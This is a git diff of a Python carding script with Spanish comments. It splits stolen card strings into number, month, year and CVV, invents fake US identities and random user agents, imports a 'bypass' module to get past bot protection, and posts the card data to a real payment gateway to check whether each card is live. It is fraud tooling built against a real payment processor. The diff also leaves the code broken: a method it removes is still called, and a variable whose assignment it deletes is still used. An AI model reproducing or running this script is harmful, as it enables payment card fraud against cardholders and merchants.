@@ -17,10 +17,8 @@ from bs4 import BeautifulSoup
 from selenium.webdriver.common.by import By
 from selenium.webdriver.support.ui import WebDriverWait
 from selenium.webdriver.support import expected_conditions as EC
-from bypass import obtener_driver_autorizado
+from bypasss import obtener_driver_autorizado
 
-# Importamos la función de nuestro archivo bypass.py
-from bypass import obtener_driver_autorizado 
 def generate_usa_address():
 	fake = Faker('en_US')
 	try:
@@ -40,35 +38,45 @@ def generate_usa_address():
 		}
 	except KeyError:
 		return generate_usa_address()
+
 class ConfigsPAge:
     @classmethod
+    
     def QueryText(self, data:str=None, chainOne:str=None, chainTwo:str=None):
 
         try:               return data[ data.index(chainOne) + len (chainOne):data.index(chainTwo,  data.index(chainOne) + len (chainOne))]
         except ValueError: return None 
 
-    @classmethod
-    def RandomName(self, dato: str = None):
-        if dato == 'email':
-            self.email = "{}{}{}@gmail.com".format(
-                names.get_first_name(),
-                names.get_last_name(),
-                random.randint(1000000, 9999999)
-            )
-            return self.email
-        
-        else:
-            return 'Valores incorrectos: >>>   ConfigsPAge().RandomName("username")'
+    def Ccs(self, cards:str=None):
+        if '|' in cards: 
+            return cards.split('|')
+        elif ':' in cards: 
+            return cards.split(':')
+        elif ',' in cards: 
+            return cards.split(',')
+        elif '-' in cards: return cards.split('-')
 
+        return cards
 @dataclass
-class b3:
-    def main(self, card):
+class b35:
+    def __init__(self, tarjeta):
+
+            partes = tarjeta.split("|")
+        
+            self.tarjeta = tarjeta
+            if len(partes) == 4:
+                self.cc = partes[0]
+                self.mes = partes[1]
+                self.ano = partes[2]
+                self.cvv = partes[3]
+
+    def main(self):
         try:
             self.Nombre = ConfigsPAge().RandomName('username')
             self.UseMail = ConfigsPAge().RandomName('email')
             firstname, lastname, email, phone, street, postcode, date = (generate_usa_address().get(k, '') for k in ['firstname', 'lastname', 'email', 'telephone', 'street', 'postcode', 'date'])
             self.ua = UserAgent().random
-            self.ccs = card.split('|')
+
 
             if self.ccs[0].startswith("4"): self.brand = "VI"
             if self.ccs[0].startswith("3"): self.brand = "AE"
@@ -159,7 +167,7 @@ class b3:
             yy = self.ccs[2][-2:]
 
             headers = {'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7','accept-language': 'es-419,es;q=0.9','cache-control': 'max-age=0','content-type': 'application/x-www-form-urlencoded','origin': 'https://portal.apsclicktopay.com','priority': 'u=0, i','referer': 'https://portal.apsclicktopay.com/','upgrade-insecure-requests': '1','user-agent': user_agent_autorizado,}
-            data = {'billing-cc-number': self.ccs[0].replace(' ', ''),'billing-cc-exp': f'{self.ccs[1]}/{self.ccs[2]}','billing-cvv': self.ccs[3],}
+            data = {'billing-cc-number': self.cc.replace(' ', ''),'billing-cc-exp': f'{self.mes}/{self.ano}','billing-cvv': self.cvv,}
             r6 = session.post(f'https://gateway.repay.com/api/v2/three-step/{token}', headers=headers, data=data)
 
             headers = {'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7','accept-language': 'es-419,es;q=0.9','cache-control': 'max-age=0','priority': 'u=0, i','referer': 'https://portal.apsclicktopay.com/','upgrade-insecure-requests': '1','user-agent': user_agent_autorizado,}
